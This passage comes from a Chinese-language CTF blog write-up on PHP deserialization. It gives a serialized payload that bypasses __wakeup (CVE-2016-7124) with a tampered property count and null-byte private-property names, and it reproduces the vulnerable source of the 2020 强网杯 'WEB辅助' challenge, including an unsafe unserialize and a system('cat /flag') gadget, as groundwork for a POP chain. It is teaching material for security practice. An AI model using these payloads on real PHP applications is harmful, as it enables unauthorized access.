class="variable">$flag</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>我们想要输出flag的话，需要满足这个if条件，以及要绕过password要弱等于100 那一坨的限制，不然会被die，如果仔细看的话，我们还需要绕过下面这个</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>____wakeup函数里会把我们的username赋值为guest。因为__wakeup函数是在__destruct函数之前运行的，所以我们要绕过它, 那就涉及到这个__wakeup()绕过方法漏洞（CVE-2016-7124）</p><br><h3 id="构造exp"><a href="#构造exp" class="headerlink" title="构造exp"></a>构造exp</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;100&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$name</span> = <span class="keyword">new</span> <span class="title class_">Name</span>;</span><br><span class="line"><span class="keyword">print</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$name</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>反序列化生成：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;Name&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">14</span>:<span class="string">&quot;Nameusername&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">14</span>:<span class="string">&quot;Namepassword&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;100&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>注意这里我们只是生成了反序列化，还没有去绕过__wakeup()魔法函数</p><p>前面也说了 在特定php版本存在：序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行，我们这里的真实的属性个数2个，那我们将2 改为3 即可成功绕过 ____wakeup的执行</p></blockquote><p>将上面生成的反序列化的2改为3：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;Name&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">14</span>:<span class="string">&quot;Nameusername&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">14</span>:<span class="string">&quot;Namepassword&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;100&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p><a data-fancybox="gallery" data-src="https://i.imgtg.com/2022/05/11/zYLm1.png" data-caption="zYLm1.png"><img src="https://i.imgtg.com/2022/05/11/zYLm1.png" alt="zYLm1.png"></a></p><p>看到这，你是否想要XXXXXX?</p><p>WTF??????</p><p>你细节想想为什么？这其实是涉及到了反序列化过程中的属性权限格式问题了，这个问题这里就不讲了，可以去看看这篇文章，有很仔细的讲过，<a href="https://imhopper.github.io/2022/05/07/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%20PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/#PHP%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E6%9D%83%E9%99%90%E9%97%AE%E9%A2%98">———&gt;&gt;&gt;&gt;&gt;  记一次再学习，深入理解 PHP反序列化漏洞学习和总结</a></p><p>那我们修改完的权限格式后变为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;Name&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">14</span>:<span class="string">&quot;%00Name%00username&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">14</span>:<span class="string">&quot;%00Name%00password&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;100&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>再去传参数：</p><p><a data-fancybox="gallery" data-src="https://i.imgtg.com/2022/05/11/zYEVI.png" data-caption="zYEVI.png"><img src="https://i.imgtg.com/2022/05/11/zYEVI.png" alt="zYEVI.png"></a></p><blockquote><p>这个题分析的比较细，但还是觉得题，不再于去讲速度，而是要看到后面的知识点，这才是最重要的，网上有很多的复现，但很多都是copy - &gt; copy , 我们还是知其所以然</p></blockquote><br><h2 id="2020强网杯”WEB辅助”POP链的构造"><a href="#2020强网杯”WEB辅助”POP链的构造" class="headerlink" title="2020强网杯”WEB辅助”POP链的构造"></a>2020强网杯”WEB辅助”POP链的构造</h2><blockquote><p>其实上面一个题，是为这道题做的准备。。。</p></blockquote><p>题目给了源码，我们直接进行代码分析，这里已经给每个php文件做了些注释，方便后期构造POP链，一共4个文件分别是：</p><p>class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 定义类player</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">player</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$user</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$pass</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$admin</span>;</span><br><span class="line">    <span class="comment">// 对象创建时调用</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$user</span>, <span class="variable">$pass</span>, <span class="variable">$admin</span> = <span class="number">0</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user = <span class="variable">$user</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;pass = <span class="variable">$pass</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;admin = <span class="variable">$admin</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 返回类对象里 admin变量</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_admin</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;admin;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义类 topsolo</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">topsolo</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 当对象创建时调用</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span> = <span class="string">&#x27;Riven&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 方法TP</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">TP</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">gettype</span>(<span class="variable">$this</span>-&gt;name) === <span class="string">&quot;function&quot;</span> <span class="keyword">or</span> <span class="title function_ invoke__">gettype</span>(<span class="variable">$this</span>-&gt;name) === <span class="string">&quot;object&quot;</span>)&#123;</span><br><span class="line">            <span class="variable">$name</span> = <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">            <span class="variable">$name</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 当一个对象销毁时调用，执行对象TP的方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">TP</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义类midsolo</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">midsolo</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 当一个对象创建时调用</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 当使用unserialize时触发，如果里面的name不等于 ‘Yasuo’,就赋值为‘Yasuo’ ，并输出打印值</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;name !== <span class="string">&#x27;Yasuo&#x27;</span>)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;name = <span class="string">&#x27;Yasuo&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;No Yasuo! No Soul!\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 当脚本尝试将对象调用为函数时触发，执行对象里的Gank方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">Gank</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Gank方法，当对象里的name的值是‘Yasuo’，输出 Are you orphan? 否者输出 Must Be Yasuo!</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Gank</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">stristr</span>(<span class="variable">$this</span>-&gt;name, <span class="string">&#x27;Yasuo&#x27;</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Are you orphan?\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Must Be Yasuo!\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义类 jungle</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">jungle</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 当一个对象创建时调用，对象里的name赋值为 &quot;Lee Sin&quot;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span> = <span class="string">&quot;Lee Sin&quot;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义KS方法，获取flag</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">KS</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 把类当作字符串使用时触发，执行对象里的KS方法，并返回空</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">KS</span>();  </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;  </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br><p>common.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;\0*\0&#x27;</span>, <span class="title function_ invoke__">chr</span>(<span class="number">0</span>).<span class="string">&quot;*&quot;</span>.<span class="title function_ invoke__">chr</span>(<span class="number">0</span>), <span class="variable">$data</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">chr</span>(<span class="number">0</span>).<span class="string">&quot;*&quot;</span>.<span class="title function_ invoke__">chr</span>(<span class="number">0</span>), <span class="string">&#x27;\0*\0&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(<span class="variable">$data</span>, <span class="string">&#x27;name&#x27;</span>)!==False)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Name Pass\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br><p>play.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;common.php&quot;</span>;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">@<span class="variable">$player</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">read</span>(<span class="title function_ invoke__">check</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;caches/&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>])))));</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$player</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$player</span>-&gt;<span class="title function_ invoke__">get_admin</span>() === <span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;FPX Champion\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;The Shy unstoppable\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;common.php&quot;</span>;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="variable">$player</span> = <span class="keyword">new</span> <span class="title function_ invoke__">player</span>(<span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;caches/&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]), <span class="title function_ invoke__">write</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$player</span>))); </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;Welcome %s, your ip is %s\n&#x27;</span>, <span class="variable">$username</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Please input the username or password!\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://blog.csdn.net/mizhenxiao/article/details/51922965">https://blog.csdn.net/mizhenxiao/article/details/51922965</a></p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
          <category> pop链 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP反序列化漏洞 </tag>
            
            <tag> POP链构造 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
